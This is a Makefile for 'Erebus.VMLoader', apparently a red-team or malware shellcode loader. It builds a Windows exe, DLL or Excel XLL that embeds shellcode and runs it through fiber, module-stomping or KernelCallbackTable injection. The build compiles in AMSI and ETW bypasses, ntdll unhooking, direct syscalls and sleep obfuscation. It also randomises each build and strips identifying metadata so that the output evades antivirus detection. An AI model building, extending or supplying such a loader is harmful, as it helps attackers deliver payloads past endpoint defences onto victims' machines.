# Erebus.VMLoader Makefile
#
# Builds two targets:
#   builder/vmloader_builder  - native host binary that emits include/embedded.h
#   erebus_vm.{exe,dll,xll}  - Windows loader binary (cross-compiled)
#
# Usage:
#   make                          # embedded + exe (INJECTION_TYPE=2, fiber)
#   make INJECTION_TYPE=6         # embedded + exe (module stomp)
#   make INJECTION_TYPE=7         # embedded + exe (kernel callback table)
#   make TARGET=dll               # DLL output
#   make TARGET=xll               # XLL output
#   make embedded                 # (re)generate include/embedded.h only
#   make clean                    # remove obj/, outputs, embedded.h
#
# Self-injection types supported:
#   2  CreateFiber (default, inline handler)
#   6  ModuleStomp (compiles injection_module_stomp.cpp)
#   7  KernelCallbackTable (compiles injection_kernelcallback.cpp)

# ---------------------------------------------------------------------------
# OS / compiler detection (mirrors Erebus.Loader Makefile)
# ---------------------------------------------------------------------------

ifeq ($(OS),Windows_NT)
	DETECTED_OS := Windows
	ifneq ($(MSYSTEM),)
		ARCH ?= x64
		ifeq ($(ARCH),x64)
			CC      := g++
			WINDRES := windres
			MINGW_INCLUDE := -I/mingw64/include
			ARCH_FLAGS := -m64
		else ifeq ($(ARCH),x86)
			CC      := g++
			WINDRES := windres
			MINGW_INCLUDE := -I/mingw32/include
			ARCH_FLAGS := -m32
		endif
	else
		CC      := g++
		WINDRES := windres
		MINGW_INCLUDE :=
	endif
else
	DETECTED_OS := Linux
	ARCH ?= x64
	ifeq ($(ARCH),x64)
		CC      := x86_64-w64-mingw32-g++
		WINDRES := x86_64-w64-mingw32-windres
		MINGW_INCLUDE := -I/usr/x86_64-w64-mingw32/include
		ARCH_FLAGS := -m64
	else ifeq ($(ARCH),x86)
		CC      := i686-w64-mingw32-g++
		WINDRES := i686-w64-mingw32-windres
		MINGW_INCLUDE := -I/usr/i686-w64-mingw32/include
		ARCH_FLAGS := -m32
	endif
endif

# Native compiler for the host-side builder binary (never cross-compile)
NATIVE_CC := g++

# ---------------------------------------------------------------------------
# Build parameters
# ---------------------------------------------------------------------------

BUILD          ?= release
TARGET         ?= exe
ARCH           ?= x64
INJECTION_TYPE ?= 2
CONFIG_SYSCALL_BACKEND        ?= 0
CONFIG_SLEEP_OBFUSCATION_TYPE ?= 0
CONFIG_AMSI_BYPASS_TYPE       ?= 1
CONFIG_ETW_BYPASS_TYPE        ?= 0
CONFIG_UNHOOK_SCOPE           ?= 0

# [MALLEABLE] Per-build randomisation parameters.
# builder.py generates fresh values on every build and passes them here.
# Defaults below produce a functional but non-randomised loader.
VM_IR_SEED         ?= 0xC0DE1337U
VM_FWD_0           ?= 7
VM_FWD_1           ?= 5
VM_FWD_2           ?= 3
VM_FWD_3           ?= 1
VM_FWD_4           ?= 6
VM_FWD_5           ?= 0
VM_FWD_6           ?= 2
VM_FWD_7           ?= 4
VM_KEY_BASE_0      ?= 0x65
VM_KEY_BASE_1      ?= 0x72
VM_KEY_BASE_2      ?= 0x65
VM_KEY_BASE_3      ?= 0x62
VM_KEY_BASE_4      ?= 0x75
VM_KEY_BASE_5      ?= 0x73
VM_SLEEP_BASE_MS   ?= 5000
VM_SLEEP_JITTER_MS ?= 3000

LOADER_ROOT := ../Erebus.Loader

# ---------------------------------------------------------------------------
# Loader CFLAGS
# ---------------------------------------------------------------------------

VM_RANDOM_DEFS := \
    -DVM_IR_SEED=$(VM_IR_SEED) \
    -DVM_FWD_0=$(VM_FWD_0) \
    -DVM_FWD_1=$(VM_FWD_1) \
    -DVM_FWD_2=$(VM_FWD_2) \
    -DVM_FWD_3=$(VM_FWD_3) \
    -DVM_FWD_4=$(VM_FWD_4) \
    -DVM_FWD_5=$(VM_FWD_5) \
    -DVM_FWD_6=$(VM_FWD_6) \
    -DVM_FWD_7=$(VM_FWD_7) \
    -DVM_KEY_BASE_0=$(VM_KEY_BASE_0) \
    -DVM_KEY_BASE_1=$(VM_KEY_BASE_1) \
    -DVM_KEY_BASE_2=$(VM_KEY_BASE_2) \
    -DVM_KEY_BASE_3=$(VM_KEY_BASE_3) \
    -DVM_KEY_BASE_4=$(VM_KEY_BASE_4) \
    -DVM_KEY_BASE_5=$(VM_KEY_BASE_5) \
    -DVM_SLEEP_BASE_MS=$(VM_SLEEP_BASE_MS) \
    -DVM_SLEEP_JITTER_MS=$(VM_SLEEP_JITTER_MS)

COMMON_FLAGS := -std=c++20 -Wall \
                -I"$(CURDIR)/include" \
                -I"$(LOADER_ROOT)/include" \
                $(MINGW_INCLUDE) \
                $(ARCH_FLAGS) \
                -masm=intel \
                -fno-stack-protector \
                -fno-exceptions \
                -fno-rtti \
                -Wno-unknown-pragmas \
                -Wno-unused-function \
                -Wno-narrowing \
                -DCONFIG_INJECTION_TYPE=$(INJECTION_TYPE) \
                -DCONFIG_INJECTION_MODE=2 \
                -DCONFIG_ENCRYPTION_TYPE=0 \
                -DCONFIG_SYSCALL_BACKEND=$(CONFIG_SYSCALL_BACKEND) \
                -DCONFIG_SLEEP_OBFUSCATION_TYPE=$(CONFIG_SLEEP_OBFUSCATION_TYPE) \
                -DCONFIG_AMSI_BYPASS_TYPE=$(CONFIG_AMSI_BYPASS_TYPE) \
                -DCONFIG_ETW_BYPASS_TYPE=$(CONFIG_ETW_BYPASS_TYPE) \
                -DCONFIG_UNHOOK_SCOPE=$(CONFIG_UNHOOK_SCOPE) \
                $(VM_RANDOM_DEFS) \
                $(if $(EREBUS_HASH_SEED),-DEREBUS_HASH_SEED=$(EREBUS_HASH_SEED),)

ifeq ($(ARCH),x64)
	COMMON_FLAGS += -mno-red-zone
endif

ifeq ($(BUILD),debug)
	CFLAGS  := -g -O0 -D_DEBUG $(COMMON_FLAGS)
	LDFLAGS := -static -static-libgcc -static-libstdc++ -Wl,--gc-sections
else
	CFLAGS  := -DNDEBUG -Os $(COMMON_FLAGS) \
	           -ffunction-sections \
	           -fdata-sections \
	           -fno-asynchronous-unwind-tables \
	           -fno-unwind-tables \
	           -fno-ident \
	           -fmerge-all-constants
	LDFLAGS := -s -static -static-libgcc -static-libstdc++ \
	           -Wl,--gc-sections \
	           -Wl,--strip-all \
	           -Wl,--no-insert-timestamp \
	           -Wl,--build-id=none
endif

LIBS := -liphlpapi -lws2_32

# ---------------------------------------------------------------------------
# SysWhispers3 backend
# ---------------------------------------------------------------------------

ifeq ($(CONFIG_SYSCALL_BACKEND),1)
	CFLAGS += -DCONFIG_SYSCALL_BACKEND=1
endif

# ---------------------------------------------------------------------------
# Output name
# ---------------------------------------------------------------------------

DEF_FILE := $(wildcard $(CURDIR)/defs/proxy.def)
ifneq ($(DEF_FILE),)
	DEF_LINK := -Wl,$(DEF_FILE)
else
	DEF_LINK :=
endif

ifeq ($(TARGET),dll)
	CFLAGS  += -DBUILD_DLL
	LDFLAGS += -shared -Wl,--subsystem,windows
	ifneq ($(DEF_LINK),)
		LDFLAGS += $(DEF_LINK)
	endif
	OUT := erebus_vm.dll
else ifeq ($(TARGET),xll)
	CFLAGS  += -DBUILD_XLL
	LDFLAGS += -shared -Wl,--subsystem,windows
	OUT := erebus_vm.xll
else
	ifeq ($(BUILD),release)
		LDFLAGS += -mwindows
	endif
	OUT := erebus_vm.exe
endif

# ---------------------------------------------------------------------------
# Shared Erebus.Loader sources compiled into the VMLoader binary
# ---------------------------------------------------------------------------

LOADER_SHARED_SRCS := \
    $(LOADER_ROOT)/src/helpers/peb_helpers.cpp \
    $(LOADER_ROOT)/src/helpers/api_hashing.cpp \
    $(LOADER_ROOT)/src/evasion/evasion.cpp \
    $(LOADER_ROOT)/src/evasion/ntdll_unhook.cpp \
    $(LOADER_ROOT)/src/evasion/amsi_bypass.cpp \
    $(LOADER_ROOT)/src/evasion/etw_bypass.cpp \
    $(LOADER_ROOT)/src/evasion/syscalls.cpp \
    $(LOADER_ROOT)/src/evasion/sleep_obfuscation.cpp

# SysWhispers3 - add sw3_backend.cpp + Syscalls.c when selected
ifeq ($(CONFIG_SYSCALL_BACKEND),1)
    SW3_C_SRC := $(LOADER_ROOT)/src/evasion/Syscalls.c
    LOADER_SHARED_SRCS += $(LOADER_ROOT)/src/evasion/sw3_backend.cpp
endif

# Injection sources - only the selected type; type 2 is inline in the handler
ifeq ($(INJECTION_TYPE),6)
    LOADER_SHARED_SRCS += $(LOADER_ROOT)/src/injection/injection_module_stomp.cpp
else ifeq ($(INJECTION_TYPE),7)
    LOADER_SHARED_SRCS += $(LOADER_ROOT)/src/injection/injection_kernelcallback.cpp
endif

LOADER_SRCS := src/main.cpp $(LOADER_SHARED_SRCS)

# ---------------------------------------------------------------------------
# Object file mapping - flatten into obj/ with prefixed names
# ---------------------------------------------------------------------------

# src/main.cpp → obj/main.o
# $(LOADER_ROOT)/src/foo/bar.cpp → obj/loader_foo/bar.o
LOADER_OBJS := obj/main.o \
    $(patsubst $(LOADER_ROOT)/src/%.cpp,obj/loader_%.o,$(LOADER_SHARED_SRCS))

# Sw3 Syscalls.c object (special compile flags)
ifdef SW3_C_SRC
    SW3_C_OBJ := obj/loader_evasion/Syscalls.o
    LOADER_OBJS += $(SW3_C_OBJ)
endif

# ---------------------------------------------------------------------------
# Compile rules
# ---------------------------------------------------------------------------

obj/:
	@mkdir -p obj/loader_helpers obj/loader_evasion obj/loader_injection

obj/main.o: src/main.cpp include/embedded.h | obj/
	$(CC) $(CFLAGS) -c $< -o $@

obj/loader_%.o: $(LOADER_ROOT)/src/%.cpp | obj/
	@mkdir -p $(dir $@)
	$(CC) $(CFLAGS) -c $< -o $@

# Syscalls.c needs extra -Wa flags (same as Erebus.Loader Makefile)
ifdef SW3_C_SRC
$(SW3_C_OBJ): $(SW3_C_SRC) | obj/
	@mkdir -p $(dir $@)
	$(CC) $(CFLAGS) \
	    -Wa,-msyntax=intel,-mnaked-reg \
	    -I$(LOADER_ROOT)/include/evasion/sw3 \
	    -include $(LOADER_ROOT)/include/evasion/sw3/se_signing_level_shim.h \
	    -c $< -o $@
endif

# ---------------------------------------------------------------------------
# Link
# ---------------------------------------------------------------------------

$(OUT): $(LOADER_OBJS)
	$(CC) $(LDFLAGS) $^ -o $@ $(LIBS)

# ---------------------------------------------------------------------------
# Builder (native host binary)
# ---------------------------------------------------------------------------

BUILDER_CFLAGS := -std=c++20 -O2 \
    -I"$(CURDIR)/include" \
    -I"$(LOADER_ROOT)/include" \
    $(VM_RANDOM_DEFS)

BUILDER_SRC := builder/vmloader_builder.cpp
BUILDER_BIN := builder/vmloader_builder$(if $(filter Windows,$(DETECTED_OS)),.exe,)

$(BUILDER_BIN): $(BUILDER_SRC) include/vm_loader.hpp
	@mkdir -p builder
	$(NATIVE_CC) $(BUILDER_CFLAGS) $< -o $@

include/embedded.h: $(BUILDER_BIN) $(LOADER_ROOT)/include/shellcode.hpp
	$(BUILDER_BIN) > $@

embedded: include/embedded.h

# ---------------------------------------------------------------------------
# Default and convenience targets
# ---------------------------------------------------------------------------

all: embedded $(OUT)

dll:
	$(MAKE) TARGET=dll

exe:
	$(MAKE) TARGET=exe

xll:
	$(MAKE) TARGET=xll

x64:
	$(MAKE) ARCH=x64

x86:
	$(MAKE) ARCH=x86

x64-dll:
	$(MAKE) ARCH=x64 TARGET=dll

x86-dll:
	$(MAKE) ARCH=x86 TARGET=dll

x64-exe:
	$(MAKE) ARCH=x64 TARGET=exe

x86-exe:
	$(MAKE) ARCH=x86 TARGET=exe

x64-xll:
	$(MAKE) ARCH=x64 TARGET=xll

x86-xll:
	$(MAKE) ARCH=x86 TARGET=xll

# ---------------------------------------------------------------------------
# Clean
# ---------------------------------------------------------------------------

clean:
	rm -rf obj/ erebus_vm.exe erebus_vm.dll erebus_vm.xll \
	       $(BUILDER_BIN) include/embedded.h

.PHONY: all dll exe xll x64 x86 x64-dll x86-dll x64-exe x86-exe x64-xll x86-xll \
        embedded clean
